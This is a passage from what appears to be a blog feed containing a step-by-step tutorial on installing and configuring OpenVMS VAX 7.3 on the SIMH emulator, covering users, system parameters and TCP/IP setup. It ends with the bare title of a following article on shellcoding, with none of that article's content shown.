<p>You will now be dropped at what looks like a shell-prompt. OpenVMS and OpenVMS components are generally installed by extracting backup archives. This of course comes from the days when tape drives were more common. Let&#8217;s extract the backup saveset to our first drive with &#8220;<strong>backup dua3:vms073.b&#47;save_set dua0:</strong>&#8221;:</p>

<pre><code>$ backup dua3:vms073.b&#47;save_set dua0:

%BACKUP-I-PROCDONE, operation completed.  Processing finished at  9-JAN-2009 20:20:00.82
If you do not want to perform another standalone BACKUP operation,
use the console to halt the system.

If you do want to perform another standalone BACKUP operation, 
ensure the standalone application volume is online and ready.
Enter "YES" to continue: 
</code></pre>

<p>This will take a short time, and you won&#8217;t be informed until it is complete. We are finished with this for now, so you may press CTRL-E to halt our system and drop you at the SIMH prompt. Now we boot the system again with &#8220;<strong>boot cpu</strong>&#8221;:</p>

<pre><code>Simulation stopped, PC: 839ABD46 (BEQL 839ABDB4)
sim&#62; boot cpu

KA655-B V5.3, VMB 2.7
Performing normal system tests.
40..39..38..37..36..35..34..33..32..31..30..29..28..27..26..25..
24..23..22..21..20..19..18..17..16..15..14..13..12..11..10..09..
08..07..06..05..04..03..
Tests completed.
</code></pre>

<p>Great. Now this time, instead of booting <strong>dua3</strong>, we will boot our first virtual hard disk where we just installed the backup to - <strong>dua0</strong>:</p>

<pre><code>&#62;&#62;&#62;set boot dua0
&#62;&#62;&#62;boot
(BOOT&#47;R5:0 DUA0

  2..
-DUA0
  1..0..

%SYSBOOT-I-SYSBOOT Mapping the SYSDUMP.DMP on the System Disk
%SYSBOOT-W-SYSBOOT Can not map SYSDUMP.DMP on the System Disk
%SYSBOOT-I-SYSBOOT Mapping PAGEFILE.SYS on the System Disk
%SYSBOOT-I-SYSBOOT SAVEDUMP parameter not set to protect the PAGEFILE.SYS
   OpenVMS (TM) VAX Version BI73-7G7 Major version id = 1 Minor version id = 0
%WBM-I-WBMINFO Write Bitmap has successfully completed initialization.

           OpenVMS VAX V7.3 Installation Procedure

                 Model: VAXserver 3900 Series
                 System device: RA92 - _DUA0:
                   Free Blocks: 2854566
                      CPU type: 10-01

* Please enter the date and time (DD-MMM-YYYY HH:MM) 09-JAN-2009 20:36
</code></pre>

<p>As you can see, we are now entering the real OpenVMS installation and it reports that we are using a VAXServer 3900, the system disk is a DEC RA92 and we have 2854566 blocks free. Enter the current date+time, then hit enter.  </p>

<p>You&#8217;ll see quite a few messages scrolling up the screen, one which may seem quite alarming is:</p>

<pre><code>%%%%%%%%%%%  OPCOM   9-JAN-2009 20:36:08.92  %%%%%%%%%%%
Message from user SYSTEM
%LICENSE-E-NOAUTH, DEC VAX-VMS use is not authorized on this node
-LICENSE-F-NOLICENSE, no license is active for this software product
-LICENSE-I-SYSMGR, please see your system manager
</code></pre>

<p>During the install, we will enter our license for DEC VAX-VMS; So just ignore this for now. Let&#8217;s continue:</p>

<p>If this system disk is to be used in an OpenVMS Cluster with multiple system disks, then each system disk must have a unique volume label. Any nodes having system disks with duplicate volume labels will fail to boot into the cluster.</p>

<pre><code>   You can indicate a volume 
   label of 1 to 12 characters in length.
   If you want to use the default name of
   OVMSVAXSYS, press RETURN in response to
   the next question.

* Enter the volume label for this system disk [OVMSVAXSYS]: 
</code></pre>

<p>For this tutorial, I won&#8217;t cover setting up a cluster so just leave the default.</p>

<pre><code>* Enter name of drive holding the OpenVMS distribution media: DUA3
* Is the OpenVMS media ready to be mounted? [N] Y
%MOUNT-I-MOUNTED, VAXVMS073 mounted on _DUA3:

   Select optional software you want to install.  You can install one
   or more of the following OpenVMS or DECwindows components:

    o OpenVMS library                              -  52200 blocks
    o OpenVMS optional                             -  19000 blocks
    o OpenVMS Help Message                         -  10400 blocks
    o OpenVMS Management Station                   -  20000 blocks
    o DECwindows base support                      -   4400 blocks
    o DECwindows workstation support               -  23800 blocks
          -  75 dots per inch video fonts          -    (included)
          - 100 dots per inch video fonts          -   6200 blocks
    o DECnet-Plus networking                       -  80000 blocks
    o DECnet Phase IV networking                   -    800 blocks

        Space remaining on system disk:  2854377 blocks
</code></pre>

<p>You can go ahead and install everything if you have space, I imagine you will want to see everything OpenVMS has to offer at some point - so it&#8217;s best to install these sets now rather than later.</p>

<pre><code>* Do you want to install the OpenVMS library files? (Y&#47;N) Y

    Space remaining on system disk:  2802177 blocks

* Do you want to install the OpenVMS optional files? (Y&#47;N) Y

    Space remaining on system disk:  2783177 blocks

~~

* Do you want to install the MSGHLP database? (Y&#47;N) Y

~~ 

* Where do you want to install the MSGHLP database?
    [SYS$COMMON:[SYSHLP]] [ENTER]

~~

* Do you want to install the optional OpenVMS Management Station files? (Y&#47;N) Y

~~

* Do you want the DECwindows base support? (Y&#47;N) Y

~~

* Do you want to install DECwindows workstation support? (Y&#47;N) Y

~~

* Do you want 100 dots per inch video fonts installed? (Y&#47;N) Y

~~

* Do you want to install DECnet-Plus? (Y&#47;N) Y

~~

    The following options will be provided:

        OpenVMS library
        OpenVMS optional
        OpenVMS Help Message
        OpenVMS Management Station Software -- PC files
        DECwindows base support
        DECwindows workstation support with:
            -  75 dots per inch video fonts
            - 100 dots per inch video fonts
        DECnet-Plus

    Space remaining on system disk:  2638377 blocks

* Is this correct? (Y&#47;N) Y
</code></pre>

<p>Phew! Now, at last - the backup save sets will be extracted&#47;restored. This will take some time, enough for a cigarette at least. When it completes, you&#8217;ll be presented with some useful information regarding OpenVMS Clusters:</p>

<pre><code>In an OpenVMS Cluster, you can run multiple systems sharing all files
   except PAGEFILE.SYS, SWAPFILE.SYS, SYSDUMP.DMP, and VAXVMSSYS.PAR.

   Cluster configuration cannot be done at this time because no network
   is present.  In order to configure a cluster you must FIRST do one
   or both of the following:

   o Install DECnet-Plus (or DECnet Phase IV), or
   o Execute SYS$STARTUP:LAN$STARTUP.COM by removing the
      comment delimiter ("!") from the line

          $! @SYS$STARTUP:LAN$STARTUP

     in SYS$MANAGER:SYSTARTUP_VMS.COM.

   Then configure the cluster by executing the following command:

             @ @SYS$MANAGER:CLUSTER_CONFIG

   See the OpenVMS System Manager&#39;s Manual: Essentials for more information.
</code></pre>

<p>For future reference, you should keep a copy of such messages for future configuration of components.</p>

<pre><code>    * Do you want DECwindows Motif as the default windowing system? (Y&#47;N) Y

   Now we will ask you for new passwords for the following accounts:

        SYSTEM, SYSTEST, FIELD

   Passwords must be a minimum of 8 characters in length.  All passwords
   will be checked and verified.  Any passwords that can be guessed easily
   will not be accepted.
</code></pre>

<p>Now, this is the equivalent of setting your root password on a UNIX-like Operating System. Make sure to set a decent password for SYSTEM and different passwords for SYSTESY and FIELD. You could make them all the same if you&#8217;re not planning on allowing anyone else to access your new OpenVMS system.</p>

<pre><code>* Enter password for SYSTEM: 
* Re-enter for verification: 
%UAF-I-MDFYMSG, user record(s) updated
%VMS-I-PWD_OKAY, account password for SYSTEM verified
</code></pre>

<p>You&#8217;ll see similar messages for the remaining accounts.</p>

<pre><code>Creating RIGHTS database file, SYS$SYSTEM:RIGHTSLIST.DAT
Ignore any "-SYSTEM-F-DUPIDENT, duplicate identifier" errors.

%UAF-I-RDBCREMSG, rights database created
%UAF-I-RDBADDMSGU, identifier DEFAULT value [000200,000200] added to rights database
%UAF-I-RDBADDMSGU, identifier FIELD value [000001,000010] added to rights database
%UAF-I-RDBADDMSGU, identifier SYSTEM value [000001,000004] added to rights database
%UAF-I-RDBADDMSGU, identifier SYSTEST value [000001,000007] added to rights database
%UAF-E-RDBADDERRU, unable to add SYSTEST_CLIG value [000001,000007] to rights database
-SYSTEM-F-DUPIDENT, duplicate identifier
%UAF-I-NOMODS, no modifications made to system authorization file
%UAF-I-RDBDONEMSG, rights database modified

Creating MODPARAMS.DAT database file, SYS$SYSTEM:MODPARAMS.DAT
</code></pre>

<p>These UAF messages confirm that the rights database has been created, and the system users have been added. We will use the UAF (User Authorization File) tool later to add a normal user.  </p>

<p>Next you&#8217;ll be prompted for the SCSNODE name and SCSSYSTEMID for your VMS node, as this is your first installation and not part of a cluster - enter what you like (within reason, the SCSSYSTEMID should be between 1025 and 65535).</p>

<pre><code>* Please enter the SCSNODE name: CGXVAX

* Please enter the SCSSYSTEMID:  1025
</code></pre>

<p>Now you should have your OpenVMS licenses&#47;PAKs (Product Authorization Keys) ready.</p>

<p>Continuing with OpenVMS VAX V7.3 Installation Procedure.</p>

<pre><code>    Configuring all devices on the system ...

    If you have Product Authorization Keys (PAKs) to register, you can
    register them now.

* Do you want to register any Product Authorization Keys? (Y&#47;N): Y

    VMS License Management Utility Options:

        1. REGISTER a Product Authorization Key
~~

Enter one of the above choices [1]: 1
Do you have your Product Authorization Key? [YES]: YES

Find your PAK for "VAX-VMS". This PAK will be entered manually by extracting the information from each field and entering them when prompted... For future PAKs, you may copy-paste the command straight from your e-mail.


Here is a list of the license information just entered:

                     Issuer:  OPENVMS_HOBBYIST
              Authorization:  DECUS-XXX-#########-#######
               Product Name:  VAX-VMS
                   Producer:  DEC
                      Units:  0
               Release Date:  
                    Version:  
           Termination Date:  ##-XXX-####
               Availability:  
                   Activity:  A
                    Options:  NO_SHARE
                      Token:  
                Hardware ID:  
                   Checksum:  #-XXXX-XXXX-XXXX-XXXX

Is that correct? [YES]:YES
Registering VAX-VMS license in SYS$COMMON:[SYSEXE]LMF$LICENSE.LDB...

Do you want to LOAD this license on this system? [YES]:
%LICENSE-I-LOADED, DEC VAX-VMS was successfully loaded with 0 units

You may enter some other PAKs now, or wait until later. I will install others later. Enter &#39;99 [enter]&#39; to exit the license management utility.

********************************************************************************

    After the system has rebooted you should register any additional
    Product Authorization Keys (PAKs) you have, or receive in the
    future, by executing the following procedure:

        $ @SYS$UPDATE:VMSLICENSE

    See the OpenVMS License Management Utility Manual for any additional
    information you need.

********************************************************************************
</code></pre>

<p>Another piece of useful information to remember for later. Now, you&#8217;ll be prompted to set your time zone. Follow the prompts until you&#8217;re asked to provide information about DECnet-Plus, then respond as follows:</p>

<pre><code>* Enter name of drive holding the DECnet-Plus kit: DUA3
* Is DUA3: ready to be mounted? [N] y

The following product has been selected:
    DEC VAXVMS DECNET_OSI V7.3             Layered Product

~~

This product requires one of two PAKs: DVNETEND or DVNETRTG.

Do you want the defaults for all options? [YES] YES
</code></pre>

<p>This set isn&#8217;t required, but as we had had chosen to install everything earlier - we may as well. Installation will run for a few minutes, then OpenVMS Installation will run AUTOGEN to update the system. This will take a couple of minutes, then the system will be rebooted - dropping you back at the SIMH prompt. Start the system back up:</p>

<pre><code>sim&#62; boot cpu

KA655-B V5.3, VMB 2.7
Performing normal system tests.
40..39..38..37..36..35..34..33..32..31..30..29..28..27..26..25..
24..23..22..21..20..19..18..17..16..15..14..13..12..11..10..09..
08..07..06..05..04..03..
Tests completed.

&#62;&#62;&#62;boot
(BOOT&#47;R5:0 DUA0

Soon you will see:

*****************************************************************

OpenVMS VAX V7.3

You have SUCCESSFULLY installed the OpenVMS VAX Operating System.

The system is now executing the STARTUP procedure.  Please
wait for the completion of STARTUP before logging in to the
system.

*****************************************************************

%STDRV-I-STARTUP, OpenVMS startup begun at  9-JAN-2009 21:56:36.10

~~~

%SET-I-INTSET, login interactive limit = 64, current interactive value = 0
  SYSTEM       job terminated at  9-JAN-2009 21:57:04.05

  Accounting information:
  Buffered I&#47;O count:            1621         Peak working set size:    1624
  Direct I&#47;O count:               613         Peak page file size:      5504
  Page faults:                   5578         Mounted volumes:             0
  Charged CPU time:           0 00:00:24.99   Elapsed time:     0 00:00:31.61
</code></pre>

<p>Congratulations! You have installed OpenVMS 7.3 \o&#47;. Now after all those pages of instructions and console-pastes, we&#8217;ll proceed to configure OpenVMS a little bit.  </p>

<p><strong>Configuring OpenVMS</strong>  </p>

<p>So, you are now presented with some information about your new system. Where do you go from here? Press <strong>enter</strong> and you&#8217;ll see a welcome-banner followed by a prompt for you to login. Enter &#8216;<strong>SYSTEM</strong>&#8217; as the username, and the password you set during installation.</p>

<pre><code>Username: SYSTEM
Password: 
 Welcome to OpenVMS (TM) VAX Operating System, Version V7.3
$ 
</code></pre>

<p>At this point, I can see all you UNIX-like OS users gagging to explore the system and run commands such as &#8216;uptime&#8217; and &#8216;uname -a&#8217; to show off to all your friends. Well, I&#8217;m extremely sorry to disappoint you (and perhaps wasted your time so far!) but OpenVMS is not UNIX or in fact similar to any derivatives in any way. You can throw any hopes of POSIX compatibility out the window, too (well, there <em>is</em> a POSIX compatibility interface&#47;set for OpenVMS but we won&#8217;t go into that ;).  </p>

<p>To satisfy the needs of your e-penis, you may run &#8220;<strong>sh sys</strong>&#8221; or in its full form: &#8220;<strong>show system</strong>&#8221;. The &#8220;show&#8221; command is used to spit out a variety of information, many embedded devices such as routers have similar functions.</p>

<pre><code>$ sh sys
OpenVMS V7.3  on node CGXVAX   9-JAN-2009 22:17:25.96  Uptime  0 00:21:04
  Pid    Process Name    State  Pri      I&#47;O       CPU       Page flts  Pages
00000201 SWAPPER         HIB     16        0   0 00:00:00.21         0      0   
00000205 CONFIGURE       HIB      8        5   0 00:00:00.06       112    175   
00000206 LANACP          HIB     12       33   0 00:00:00.25       366    788   
00000208 IPCACP          HIB     10        6   0 00:00:00.03        99    177   
00000209 ERRFMT          HIB      8       44   0 00:00:00.14       153    234   
0000020B OPCOM           HIB      8       48   0 00:00:00.19       304    150   
0000020C AUDIT_SERVER    HIB     10      133   0 00:00:00.53       569    815   
0000020D JOB_CONTROL     HIB     10       30   0 00:00:00.12       191    342   
0000020E SECURITY_SERVER HIB     10       35   0 00:00:00.43       766   1349   
00000211 SYSTEM          CUR      7       97   0 00:00:00.62       869    498   
</code></pre>

<p>This isn&#8217;t too different from what you&#8217;d see in a screen-dump of the &#8216;top&#8217; command on UNIX-like systems.  </p>

<p>Now, let&#8217;s get back on track. OpenVMS uses <a href="http://en.wikipedia.org/wiki/DIGITAL_Command_Language">DCL (DIGITAL Command Language)</a>, a scripting language developed by DIGITAL for their Operating Systems. You may think of it as the OpenVMS equivalent of BASH in that it&#8217;s used as a &#8220;shell&#8221;&#47;CLI as well as a normal scripting language.  </p>

<p>So far, we have used DUA3 (our virtual CD-ROM drive) and DUA0 (Our first hard disk), now we will initialise DUA1, our second virtual hard disk. It is good practice to keep system files on one disk, and data on others. This is especially useful for when&#47;if you need to reinstall the Operating System, you can keep your users&#8217; data. Let&#8217;s initialise the disk now and mount it:</p>

<pre><code>$ initialize dua1: DATA
$ mount&#47;system dua1 data
%MOUNT-I-MOUNTED, DATA mounted on _CGXVAX$DUA1:
</code></pre>

<p><strong>n.B. Remember to have around another 1.5G of space free for this else bad things will happen. On initialisation of the new volume, the file d1.dsk grew to 719M</strong>  </p>

<p>This is what you don&#8217;t want to happen, else you&#8217;ll need to boot the system again:</p>

<pre><code>$ initialize dua1: DATA
RQ I&#47;O error: No space left on device
I&#47;O error, PC: 83430D36 (ASHL #1,R3,R0)
sim&#62; 
</code></pre>

<p>Now that we have a new disk initialised and mounted, we will edit the site-specific startup file &#8220;<strong>sys$manager:systartup_vms.com</strong>&#8221; and add the mount command above so we don&#8217;t have to manually mount the volume at each startup. We will need to let OpenVMS know that we are using a VT100-compatible terminal so we can use the full-screen VMS editor &#8220;edit&#8221; properly:</p>

<pre><code>$ set term&#47;vt100
$ edit sys$manager:systartup_vms.com
</code></pre>

<p>There&#8217;s no right or wrong place to put this command really, but I like to mount volumes just before DECnet is setup+started. A general rule is to mount any additional volumes first, before running any startup processes which may rely on the volume being available:</p>

<pre><code>$! To start a batch queue, remove the comment delimiter ($!) from the
$! following command line.
$!
$!$ START &#47;QUEUE SYS$BATCH
$!
$ mount&#47;system dua1: data
$!
$! In order to use asynchronous DECnet Phase IV on OpenVMS VAX systems only,
$! remove the comment delimiter ($!) from the next two lines.

Press CTRL-Z to save and quit &#39;EDIT&#39;.

409 lines written to file SYS$COMMON:[SYSMGR]SYSTARTUP_VMS.COM;2
$ 
</code></pre>

<p>You may be wondering why &#8220;;2&#8221; is appended to the filename. OpenVMS stores multiple revisions of files as they are updated&#47;edited. Some other operating systems and&#47;or filesystems work in this manner including Novell Netware. You shouldn&#8217;t have any problems with this, until you try and delete a file - OpenVMS will ask you to specify which revision you&#8217;d like to delete ;).  </p>

<p><strong>Adding Users</strong>  </p>

<p>As in UNIX-like systems, OpenVMS has user and group IDs, however, unlike UNIX - they are not entities you can reference separately. The UID and GID-like values are an exclusive singleton, which is called a UIC (User Identification Code), the format of a UIC is [###,###] - where the first part is the group, and the second is the user. By default, users added to the UAF are disabled. We will now add our first user, whose &#8216;home&#8217; directory is on our new disk, will have full system privileges and won&#8217;t be disabled:</p>

<pre><code>$ set def sys$system
$ r authorize
UAF&#62; add int16h&#47;password=t3mp123&#47;owner="int16h"&#47;dev=dua1&#47;dir=[int16h]&#47;uic=[200,201]&#47;flag=nodisuser&#47;priv=all
%UAF-I-ADDMSG, user record successfully added
~~
</code></pre>

<p><strong>set def</strong> - This is short for &#8220;set default&#8221;, which is the equivalent of the &#8220;cd&#8221; command on UNIX-like operating systems. Navigating around an OpenVMS system may take some getting used to, just think of it as the step after moving from DOS to UNIX. In this case:</p>

<blockquote>
<p>sys$system</p>
</blockquote>

<p>is an alias for </p>

<blockquote>
<p><strong>CGXVAX$DUA0:[SYS0.SYSCOMMON.][SYSEXE]</strong></p>
</blockquote>

<p><strong>r authorize</strong> - &#8220;r&#8221; is the shortened command for run. We need to be in the sys$system logical directory to run &#8216;authorize&#8217; as this is where SYSUAF.DAT is stored.  </p>

<p>So, basically we are adding the user &#8216;int16h&#8217;, with initial password of &#8216;t3mp123&#8217; (this will be changed at first-login), owner is the user&#8217;s real-name, dev is the device where the user&#8217;s initial&#47;home directory will reside, dir is the name of the directory on &#8216;dev&#8217;, uic is the user&#8217;s UIC (groupid,uid - default group is 200), we have added the nodisuser flag to ensure the account isn&#8217;t disabled, and finally we have given the uses all privileges on the system.  </p>

<p>After you run the &#8216;add&#8217; line at the UAF prompt, your screen will fill with security notices. You should get used to them while connected to the system console, anything important you update on the system will trigger such alerts.  </p>

<p>Now, at the UAF prompt, type &#8216;exit&#8217;. UAF will inform you that the User Authorisation file and rights database have been modified:</p>

<pre><code>UAF&#62; exit
%UAF-I-DONEMSG, system authorization file modified
%UAF-I-RDBDONEMSG, rights database modified
</code></pre>

<p>Great! Now you have a &#8216;normal&#8217; user you can login as, and gain full privs if you need them! Well, not quite. We need to manually create the user&#8217;s directory and set the correct permissions:</p>

<pre><code>$ create&#47;dir dua1:[int16h]
$ set directory&#47;owner=int16h dua1:[int16h]
</code></pre>

<p>Here you can see that we use the <strong>create</strong> command to create our new directory, then <strong>set</strong> to set the owner of the directory. DCL is quite flexible and efficient, most of the time you can turn a few commands into one longer command.</p>

<pre><code>$ create&#47;dir dua1:[int16h]&#47;owner=[int16h]
</code></pre>

<p>As you can see, DCL commands are quite logical and natural - it&#8217;s just getting used to them which can be a problem when you usually spend your time in a UNIX shell.  </p>

<p>Now that we have added our user, and created a home-directory for it - you can logout and try to login with those credentials. Use &#8220;lo&#8221; (or &#8220;logout&#8221;) to log out of the system.</p>

<pre><code>$ logout
  SYSTEM       logged out at  9-JAN-2009 23:43:01.47

 Welcome to OpenVMS (TM) VAX Operating System, Version V7.3    

Username: int16h
Password: 
 Welcome to OpenVMS (TM) VAX Operating System, Version V7.3

Your password has expired; you must set a new password to log in

New password: 
Verification: 
</code></pre>

<p>As we are still using the system console, you will be notified of a &#8220;System UAF record modification&#8221; security event because we changed the password of a user.  </p>

<p>Now that we&#8217;re logged in, we want to enable our full system privileges. This is done by running &#8220;<strong>set proc&#47;priv=all</strong>&#8221;. This is like running &#8220;su&#8221; on a UNIX-like system, except that we will still be the same user - just with &#8220;superuser&#8221; powers.</p>

<pre><code>$ set proc&#47;priv=all
</code></pre>

<p><a href="http://www.wherry.com/">Phil Wherry</a> was a great help with the following, as before reading his tips - I had never installed OpenVMS and additional components from scratch, only used existing systems. We are going to be installing the OpenVMS TCP&#47;IP stack+programs, this will require us to modify resource allocations within the system. We need to edit <strong>modparams.dat</strong> in <strong>sys$system</strong>:</p>

<pre><code>$ set def sys$system
$ edit modparams.dat
</code></pre>

<p>The following lines should be added to the end of the file, save+exit by pressing CTRL-Z:</p>

<pre><code>ADD_GBLPAGES=10000
ADD_GBLSECTIONS=100
ADD_NPAGEDYN=800000
ADD_NPAGEVIR=800000
MIN_SPTREQ=6000
</code></pre>

<p>Now, these changes to the system won&#8217;t take affect straight away. You may remember earlier on that the OpenVMS Installation ran &#8220;AUTOGEN&#8221; to update the system. We will now run it manually:</p>

<pre><code>$ set def sys$update
$ @autogen getdata reboot nofeedback

%AUTOGEN-I-BEGIN, GETDATA phase is beginning.
%AUTOGEN-I-NEWFILE, A new version of SYS$SYSTEM:PARAMS.DAT has been created.
        You may wish to purge this file.
%AUTOGEN-I-END, GETDATA phase has successfully completed.
%AUTOGEN-I-BEGIN, GENPARAMS phase is beginning.
%AUTOGEN-I-NEWFILE, A new version of SYS$MANAGER:VMSIMAGES.DAT has been created.
        You may wish to purge this file.

~~
</code></pre>

<p>After many more messages, the system will shutdown and you will be back at the SIMH prompt. &#8220;<strong>boot cpu</strong>&#8221; then &#8220;<strong>boot dua0</strong>&#8221; again. To bring up the system again. Finally, login with your user-account and &#8220;<strong>set proc&#47;priv=all</strong>&#8221;. We will then set some additional system parameters and shutdown the system again. As Phil said, these two processes could be done with only 1 reboot - but it&#8217;s more clear this way and will help remind you that a reboot &#47;is&#47; required after such alterations to the system.</p>

<pre><code>$ set proc&#47;priv=all
$ r sys$system:sysgen
SYSGEN&#62;  SET INTSTKPAGES 20
SYSGEN&#62;  WRITE CURRENT
SYSGEN&#62;  EXIT
$ @sys$system:shutdown
</code></pre>

<p>Bring up the system again, and login.  </p>

<p><strong>Installing the OpenVMS TCP&#47;IP Stack+Programs</strong>  </p>

<p>Multiuser operating systems these days are mostly useless without a TCP&#47;IP stack, and a way for remote users to login. Now we will install the PAK for TCP&#47;IP and install it.</p>

<pre><code>$ set proc&#47;priv=all
$ mount&#47;over=id dua3:
MOUNT-I-WRITELOCK, volume is write locked
%MOUNT-I-MOUNTED, VAXVMS073 mounted on _CGXVAX$DUA3:
$ set def dua3:[tcpip_vax051.kit]
</code></pre>

<p>Traditionally, CD-ROMs are mounted by specifying the device and volume-ID. Providing the &#8220;&#47;over=id&#8221; parameter instructs mount to mount the volume, ignoring the name of the volume. If you now execute &#8220;DIR&#8221; (&#8220;DIRECTORY&#8221;), you can see the contents of ua3:[tcpip_vax051.kit]:</p>

<pre><code>$ dir
Directory DUA3:[TCPIP_VAX051.KIT]

DEC-VAXVMS-TCPIP-V0501-15-1.PCSI;1      

Total of 1 file.
</code></pre>

<p>As you can see, there is 1 file in this directory and it has a .PCSI extension. This is handled by the POLYCENTER Software Installation Utility. OpenVMS applications generally come in 1 of 3 kit formats:</p>

<ul>
<li>  <strong>PCSI</strong> - These are installed with the &#8220;product install&#8221; command</li>
<li>  <strong>VMSINSTAL</strong> - These are 1 or more files with a sequential extension beginning with .A</li>
<li>  <strong>Self-Extracting</strong> - The extension can vary, usually something like SFX<em>AXPEXE, SFX</em>I64EXE or SFX_VAXEXE</li>
</ul>

<p>Anyway, to get back to our installation - we first need to install the <strong>UCX</strong> PAK. Refer to your OpenVMS Hobbyist e-mail with your licenses and paste it in:</p>

<pre><code>$ $ LICENSE REGISTER UCX -
_$ &#47;ISSUER=OPENVMS_HOBBYIST -
_$ &#47;AUTHORIZATION=DECUS-XXX-#########-####### -
_$ &#47;PRODUCER=DEC -
_$ &#47;UNITS=0 -
_$ &#47;TERMINATION_DATE=##-XXX-####  -
_$ &#47;ACTIVITY=CONSTANT=100 -
_$ &#47;CHECKSUM=#-XXXX-XXXX-XXXX-XXXX

$ license load UCX
%LICENSE-I-LOADED, DEC UCX was successfully loaded with 0 units
</code></pre>

<p>Proceed to install the kit by issuing: &#8220;**product install ***&#8221; this will scan the current directory for all packages to install - as there is only one, we don&#8217;t need to select which we want and don&#8217;t want:</p>

<pre><code>$ product install *

The following product has been selected:
    DEC VAXVMS TCPIP V5.1-15               Layered Product

Do you want to continue? [YES] YES

When prompted, go for the default options.

The following product will be installed to destination:
    DEC VAXVMS TCPIP V5.1-15               DISK$OVMSVAXSYS:[VMS$COMMON.]

Portion done: 0% ~
%PCSI-I-PRCOUTPUT, output from subprocess follows ...
% - HELP has been updated. You may purge SYS$COMMON:[SYSHLP]HELPLIB.HLB 
% 
%PCSI-I-PRCOUTPUT, output from subprocess follows ...
% TCPIP-W-PCSI_INSTALL 
% - Execute SYS$MANAGER:TCPIP$CONFIG.COM to proceed with configuration of
%   Compaq TCP&#47;IP Services.
% 
Portion done: 100%

The following product has been installed:
    DEC VAXVMS TCPIP V5.1-15               Layered Product

DEC VAXVMS TCPIP V5.1-15: Compaq TCP&#47;IP Services for OpenVMS.
</code></pre>

<p>Excellent. We now have TCP&#47;IP Services installed as well as a PAK loaded so we can actually use it (remember how I mentioned limitations if you didn&#8217;t have licenses earlier?).  </p>

<p>As recommended by the installation, we will run </p>

<pre><code>SYS$MANGER:TCPIP$CONFIG.COM
</code></pre>

<p>to configure TCP&#47;IP on our system.</p>

<pre><code>$ @sys$manager:tcpip$config

TCP&#47;IP Network Configuration Procedure

This procedure helps you define the parameters required
to run Compaq TCP&#47;IP Services for OpenVMS on this system. 

*CLS*

Compaq TCP&#47;IP Services for OpenVMS Configuration Menu

    Configuration options:

         1  -  Core environment
         2  -  Client components   
         3  -  Server components   
         4  -  Optional components

         5  -  Shutdown Compaq TCP&#47;IP Services for OpenVMS
         6  -  Startup Compaq TCP&#47;IP Services for OpenVMS
         7  -  Run tests

         A  -  Configure options 1 - 4
        [E] -  Exit configuration procedure

Enter configuration option: 
</code></pre>

<p>We start by configuring the core environment. I won&#8217;t paste all menus here, just the prompts to save space.</p>

<pre><code>Enter configuration option: 1

    DOMAIN Configuration

    Enter Internet domain: cgx.org.uk

Enter configuration option: 2

    QE0 is the Ethernet device XQA0:

    QE0 has not been configured

    Compaq TCP&#47;IP Services for OpenVMS Interface QE0 Configuration Menu

    Configuration options:

         1  -  Configure interface manually       
         2  -  Let DHCP configure interface       

        [E] -  Exit menu (Do not configure interface QE0)

Enter configuration option: 1
Enter fully qualified host name: cgxvax.cgx.org.uk
Enter Internet address for cgxvax: 10.0.0.200
Enter Internet network mask for cgxvax [255.0.0.0]: [enter]
Enter broadcast mask for cgxvax [10.255.255.255]: [enter]
* Is the above correct [YES]: YES
</code></pre>

<p>We have now set the domain for our system, as well as manually configured the ethernet interface manually. You can configure this as you please of course.  </p>

<p>Next we&#8217;ll configure basic routing. At the moment, we wouldn&#8217;t really want to use our system as a router, though the Compaq TCP&#47;IP services does support a variety of protocols.</p>

<pre><code>* Do you want to configure dynamic ROUTED or GATED routing [NO]: NO

    A default route has not been configured.
* Do you want to configure a default route [YES]: YES
Enter your Default Gateway host name or address: 10.0.0.1

    10.0.0.1 is not in the local host database.
    If you want to enter the default gateway in the local host
    database, enter its host name. Otherwise, enter .

Enter the Default Gateway host name []: [ENTER]

Next, to resolve hostnames we will need to specify a nameserver.

Enter configuration option: 4
Enter your BIND server name: 10.0.0.1
Enter remote BIND server name []: [enter]
Enter next BIND server name: [enter]

Enter configuration option: E

Now that the core configuration is complete, we can enable telnet:

Enter configuration option: 2
Enter configuration option: 6
TELNET Configuration

Service is not defined in the TCPIP$SERVICE database.
Service is not enabled.
Service is stopped.

    TELNET configuration options:

         1 - Enable service on this node

        [E] - Exit TELNET configuration

Enter configuration option: 1
Creating TELNET Service entry
</code></pre>

<p>You should enable FTP from the client menu also, then exit to the main menu. Once at the main menu, chose option #6 to startup TCP&#47;IP services.</p>

<pre><code>6 - Startup Compaq TCP&#47;IP Services for OpenVMS

Begin Startup...

%TCPIP-I-INFO, TCP&#47;IP Services startup beginning at 10-JAN-2009 01:30:04.47
%TCPIP-I-INFO, creating UCX compatibility file SYS$COMMON:[SYSEXE]UCX$SERVICE.DAT
%TCPIP-I-NORMAL, timezone information verified
</code></pre>

<p>More messages will follow, you will then be prompted to &#8220;Press Resturn to continue&#8221;. Finally exit, and press &#8216;Y&#8217; when prompted to start your services (if not already started). You should now be able to connect to your system using telnet and FTP (though, not from the host system! This is a flaw in winpcap&#47;libpcap not in OpenVMS or SIMH).  </p>

<p>Finally, add </p>

<blockquote>
<p><code>$ @sys$startup:tcpip$startup</code></p>
</blockquote>

<p>to the &#8216;<strong>sys$manager:systartup_vms.com</strong>&#8217; file to enable TCP&#47;IP services to run at boot-time.  </p>

<p>Stay tuned for part 2, where we will learn more about OpenVMS, DCL and installing more software including 3rd-party products from <a href="http://www.process.com/">Process Software</a> as well as useful tools you&#8217;re familiar with such as <a href="http://www.gnu.org/software/wget/">wget</a>.  </p>

<p><strong>References and Links</strong></p>

<ul>
<li>  <a href="http://en.wikipedia.org/">http:&#47;&#47;en.wikipedia.org</a></li>
<li>  <a href="http://simh.trailing-edge.com/">http:&#47;&#47;simh.trailing-edge.com</a></li>
<li>  <a href="http://www.openvmshobbyist.com/">http:&#47;&#47;www.openvmshobbyist.com</a></li>
<li>  <a href="http://connect-community.de/">http:&#47;&#47;connect-community.de</a></li>
<li>  <a href="http://www.wherry.com/">http:&#47;&#47;www.wherry.com</a></li>
<li>  <a href="https://web.archive.org/web/20090312034321/http://64.223.189.234/">http:&#47;&#47;64.223.189.234</a>  (HoffmanLabs)</li>
</ul>

]]></description>
</item>

<item>
<guid>/articles/shellcoding_on_freebsd.html</guid>
<link>/articles/shellcoding_on_freebsd.html</link>
<pubDate>Tue, 01 Jun 2004 00:00:00 +0100</pubDate>
<title>Beginners Guide To x86 Shellcoding on FreeBSD</title>
<description><![CDATA[

<h1 id="beginners-guide-to-x86-shellcoding-on-freebsd">Beginners Guide To x86 Shellcoding on FreeBSD</h1>

